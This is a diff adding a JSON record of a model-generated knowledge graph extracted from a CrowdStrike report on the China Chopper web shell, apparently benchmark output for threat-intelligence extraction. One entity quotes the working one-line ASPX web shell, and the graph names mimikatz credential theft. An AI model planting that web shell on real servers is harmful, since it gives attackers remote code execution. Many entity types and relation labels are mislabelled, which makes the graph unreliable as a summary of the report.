@@ -1,0 +1,567 @@
+{
+  "sample_id": "malkg__201503CrowdStrikeChinaChopper.txt",
+  "sample_index": 144,
+  "source": "malkg",
+  "file_name": "201503CrowdStrikeChinaChopper.txt",
+  "method_name": "GRID_Ours (Task-bank)",
+  "method_file": "GRID_Ours.py",
+  "approach_instance_key": "GRID_two_steps_v2__e317548d844af295",
+  "generation": {
+    "status": "success",
+    "wall_seconds": 20.33056755717021,
+    "attempt_count": 1,
+    "model": "local",
+    "backend_type": "shared_vllm",
+    "token": 32768,
+    "temperature": 0.7
+  },
+  "parser": {
+    "name": "method_internal_parser",
+    "success": true
+  },
+  "generated_graph": {
+    "entities": [
+      {
+        "name": "Chopper Web shell",
+        "type": "malware",
+        "alias": [
+          "the Chopper Web shell",
+          "Chopper shell"
+        ]
+      },
+      {
+        "name": "Chinese and other malicious actors",
+        "type": "threat-actor-or-intrusion-set",
+        "alias": [
+          "Chinese malicious actors",
+          "other malicious actors"
+        ]
+      },
+      {
+        "name": "ASPX page",
+        "type": "general-software",
+        "alias": [
+          "any ASPX page"
+        ]
+      },
+      {
+        "name": "<%@ Page Language=\"Jscript%>\\<%eval(Request.Item[\"password\"],\"unsafe\");%>",
+        "type": "file",
+        "alias": [
+          "payload",
+          "ASPX payload"
+        ]
+      },
+      {
+        "name": "ASP",
+        "type": "general-software"
+      },
+      {
+        "name": "ASPX",
+        "type": "general-software"
+      },
+      {
+        "name": "PHP",
+        "type": "general-software"
+      },
+      {
+        "name": "JSP",
+        "type": "general-software"
+      },
+      {
+        "name": "CFM",
+        "type": "general-software"
+      },
+      {
+        "name": "Chopper client side binary",
+        "type": "hacker-tool"
+      },
+      {
+        "name": "trojanized DLL file",
+        "type": "file"
+      },
+      {
+        "name": "System.WebServices.dll",
+        "type": "file",
+        "alias": [
+          "DLL",
+          "the DLL"
+        ]
+      },
+      {
+        "name": "C#",
+        "type": "general-software"
+      },
+      {
+        "name": "Chopper API functions",
+        "type": "detailed-part-of-malware-or-hackertool"
+      },
+      {
+        "name": "Chopper network traffic",
+        "type": "network-traffic"
+      },
+      {
+        "name": "TCP",
+        "type": "general-software"
+      },
+      {
+        "name": "HTTP POST requests",
+        "type": "network-traffic"
+      },
+      {
+        "name": "SSL",
+        "type": "general-software"
+      },
+      {
+        "name": "network traffic patterns",
+        "type": "abstract-concept"
+      },
+      {
+        "name": "ChopShop",
+        "type": "hacker-tool"
+      },
+      {
+        "name": "MITRE",
+        "type": "security-product"
+      },
+      {
+        "name": "webshell_chopper_decode",
+        "type": "hacker-tool"
+      },
+      {
+        "name": "chop_ssl",
+        "type": "hacker-tool"
+      },
+      {
+        "name": "http",
+        "type": "hacker-tool"
+      },
+      {
+        "name": "privatekeyrsa.key",
+        "type": "file"
+      },
+      {
+        "name": "RSA",
+        "type": "general-software"
+      },
+      {
+        "name": "Chopper decode module",
+        "type": "hacker-tool"
+      },
+      {
+        "name": "Chopper decode module I have written",
+        "type": "hacker-tool"
+      },
+      {
+        "name": "Chopper traffic_ssl.pcap",
+        "type": "file"
+      },
+      {
+        "name": "Chopper traffic_http.pcap",
+        "type": "file"
+      },
+      {
+        "name": "mimikatz",
+        "type": "hacker-tool",
+        "alias": [
+          "pwd.txt",
+          "credential dumper"
+        ]
+      },
+      {
+        "name": "dir command",
+        "type": "attack-pattern"
+      },
+      {
+        "name": "w3wp.exe",
+        "type": "file",
+        "alias": [
+          "cmd.exe",
+          "renamed version of cmd.exe"
+        ]
+      },
+      {
+        "name": "z0 parameter",
+        "type": "abstract-concept"
+      },
+      {
+        "name": "z1 parameter",
+        "type": "abstract-concept"
+      },
+      {
+        "name": "z2 parameter",
+        "type": "abstract-concept"
+      },
+      {
+        "name": "base64",
+        "type": "abstract-concept"
+      },
+      {
+        "name": "hex",
+        "type": "abstract-concept"
+      },
+      {
+        "name": "commands",
+        "type": "abstract-concept"
+      },
+      {
+        "name": "responses",
+        "type": "abstract-concept"
+      },
+      {
+        "name": "portable executable (PE) files",
+        "type": "file"
+      },
+      {
+        "name": "Chopper",
+        "type": "malware"
+      },
+      {
+        "name": "CrowdStrike",
+        "type": "security-product"
+      },
+      {
+        "name": "github.com/CrowdStrike/chopshop",
+        "type": "url"
+      },
+      {
+        "name": "github.com/MITRECND/chopshop",
+        "type": "url"
+      },
+      {
+        "name": "github.com/MITRECND/htpy",
+        "type": "url"
+      },
+      {
+        "name": "http://www.mitre.org/capabilities/cybersecurity/overview/cybersecurity-blog/decrypting-ssl-withchopshop",
+        "type": "url"
+      },
+      {
+        "name": "https://www.ﬁreeye.com/content/dam/legacy/resources/pdfs/ﬁreeye-china-chopper-report.pdf",
+        "type": "url"
+      },
+      {
+        "name": "http://informationonsecurity.blogspot.com/2012/11/china-chopper-webshell.html",
+        "type": "url"
+      },
+      {
+        "name": "the attacker",
+        "type": "threat-actor-or-intrusion-set"
+      },
+      {
+        "name": "2015-02-24 07:03:05 UTC",
+        "type": "date"
+      },
+      {
+        "name": "Figure 1",
+        "type": "location"
+      },
+      {
+        "name": "Figure 2",
+        "type": "location"
+      },
+      {
+        "name": "Figure 3",
+        "type": "location"
+      },
+      {
+        "name": "CrowdStrike blog post",
+        "type": "document-or-publication"
+      },
+      {
+        "name": "APT groups",
+        "type": "threat-actor-or-intrusion-set"
+      },
+      {
+        "name": "network decoder framework",
+        "type": "infrastructure"
+      },
+      {
+        "name": "protocol",
+        "type": "abstract-concept"
+      }
+    ],
+    "relations": [
+      {
+        "sub": "Chopper Web shell",
+        "rel": "is used by",
+        "rel_type": [
+          "targets"
+        ],
+        "obj": "Chinese and other malicious actors"
+      },
+      {
+        "sub": "Chopper Web shell",
+        "rel": "is deployed on",
+        "rel_type": [
+          "compromises"
+        ],
+        "obj": "ASPX page"
+      },
+      {
+        "sub": "the payload",
+        "rel": "is available in",
+        "rel_type": [
+          "variant-of"
+        ],
+        "obj": "ASP, ASPX, PHP, JSP, CFM"
+      },
+      {
+        "sub": "the attacker",
+        "rel": "can access",
+        "rel_type": [
+          "uses"
+        ],
+        "obj": "Chopper shell"
+      },
+      {
+        "sub": "CrowdStrike",
+        "rel": "has observed",
+        "rel_type": [
+          "targets"
+        ],
+        "obj": "another deployment method"
+      },
+      {
+        "sub": "attackers",
+        "rel": "upload",
+        "rel_type": [
+          "downloads"
+        ],
+        "obj": "trojanized DLL file"
+      },
+      {
+        "sub": "trojanized DLL file",
+        "rel": "is written in",
+        "rel_type": [
+          "consists-of"
+        ],
+        "obj": "C#"
+      },
+      {
+        "sub": "System.WebServices.dll",
+        "rel": "contains",
+        "rel_type": [
+          "consists-of"
+        ],
+        "obj": "Chopper API functions"
+      },
+      {
+        "sub": "the attacker",
+        "rel": "can call",
+        "rel_type": [
+          "uses"
+        ],
+        "obj": "Chopper API functions"
+      },
+      {
+        "sub": "Chopper network traffic",
+        "rel": "has remained",
+        "rel_type": [
+          "targets"
+        ],
+        "obj": "largely unchanged"
+      },
+      {
+        "sub": "Chopper Web shell",
+        "rel": "communicates over",
+        "rel_type": [
+          "uses"
+        ],
+        "obj": "TCP"
+      },
+      {
+        "sub": "Chopper Web shell",
+        "rel": "using",
+        "rel_type": [
+          "uses"
+        ],
+        "obj": "HTTP POST requests"
+      },
+      {
+        "sub": "Chopper Web shell",
+        "rel": "is deployed on",
+        "rel_type": [
+          "targets"
+        ],
+        "obj": "Web server behind SSL"
+      },
+      {
+        "sub": "the attacker",
+        "rel": "can access",
+        "rel_type": [
+          "uses"
+        ],
+        "obj": "this Web shell variant"
+      },
+      {
+        "sub": "the attacker",
+        "rel": "can access",
+        "rel_type": [
+          "uses"
+        ],
+        "obj": "Chopper client side binary"
+      },
+      {
+        "sub": "ChopShop",
+        "rel": "is developed by",
+        "rel_type": [
+          "authored-by"
+        ],
+        "obj": "MITRE"
+      },
+      {
+        "sub": "ChopShop framework",
+        "rel": "is extendable with",
+        "rel_type": [
+          "depends-on"
+        ],
+        "obj": "modules"
+      },
+      {
+        "sub": "The Chopper decode module I have written",
+        "rel": "is designed to be chained with",
+        "rel_type": [
+          "communicates-with"
+        ],
+        "obj": "chop_ssl"
+      },
+      {
+        "sub": "The Chopper decode module I have written",
+        "rel": "is designed to be chained with",
+        "rel_type": [
+          "communicates-with"
+        ],
+        "obj": "http"
+      },
+      {
+        "sub": "chop_ssl",
+        "rel": "requires",
+        "rel_type": [
+          "depends-on"
+        ],
+        "obj": "server’s private key in RSA format"
+      },
+      {
+        "sub": "webshell_chopper_decode",
+        "rel": "requires",
+        "rel_type": [
+          "depends-on"
+        ],
+        "obj": "ChopLib 4.0 or greater"
+      },
+      {
+        "sub": "webshell_chopper_decode",
+        "rel": "requires",
+        "rel_type": [
+          "depends-on"
+        ],
+        "obj": "http"
+      },
+      {
+        "sub": "webshell_chopper_decode",
+        "rel": "decodes",
+        "rel_type": [
+          "detects"
+        ],
+        "obj": "Chopper Webshell commands and output from HTTP traffic"
+      },
+      {
+        "sub": "webshell_chopper_decode",
+        "rel": "separates",
+        "rel_type": [
+          "modifies-or-removes-or-replaces"
+        ],
+        "obj": "each command parameter 'z0', 'z1', 'z2'"
+      },
+      {
+        "sub": "commands",
+        "rel": "are encoded in",
+        "rel_type": [
+          "exploits"
+        ],
+        "obj": "either base64 or hex"
+      },
+      {
+        "sub": "responses",
+        "rel": "are not encoded",
+        "rel_type": [
+          "negation"
+        ],
+        "obj": "Commands"
+      },
+      {
+        "sub": "an attacker",
+        "rel": "runs",
+        "rel_type": [
+          "executes"
+        ],
+        "obj": "dir command"
+      },
+      {
+        "sub": "an attacker",
+        "rel": "looking for",
+        "rel_type": [
+          "targets"
+        ],
+        "obj": "w3wp.exe"
+      },
+      {
+        "sub": "an attacker",
+        "rel": "subsequently executes",
+        "rel_type": [
+          "executes"
+        ],
+        "obj": "mimikatz"
+      },
+      {
+        "sub": "Portable executable (PE) files",
+        "rel": "are parsed as",
+        "rel_type": [
+          "modifies-or-removes-or-replaces"
+        ],
+        "obj": "hex encoded"
+      },
+      {
+        "sub": "The Chopper decode module",
+        "rel": "has option to attempt to carve out and save",
+        "rel_type": [
+          "creates-or-generates"
+        ],
+        "obj": "any PE ﬁles"
+      },
+      {
+        "sub": "The Chopper decode module",
+        "rel": "can extract",
+        "rel_type": [
+          "modifies-or-removes-or-replaces"
+        ],
+        "obj": "PE files from session"
+      },
+      {
+        "sub": "The Chopper decode module",
+        "rel": "decodes",
+        "rel_type": [
+          "detects"
+        ],
+        "obj": "entire PCAP"
+      },
+      {
+        "sub": "the attacker",
+        "rel": "is using",
+        "rel_type": [
+          "targets"
+        ],
+        "obj": "APT groups"
+      },
+      {
+        "sub": "Chopper",
+        "rel": "is used by",
+        "rel_type": [
+          "targets"
+        ],
+        "obj": "APT groups"
+      }
+    ]
+  }
+}
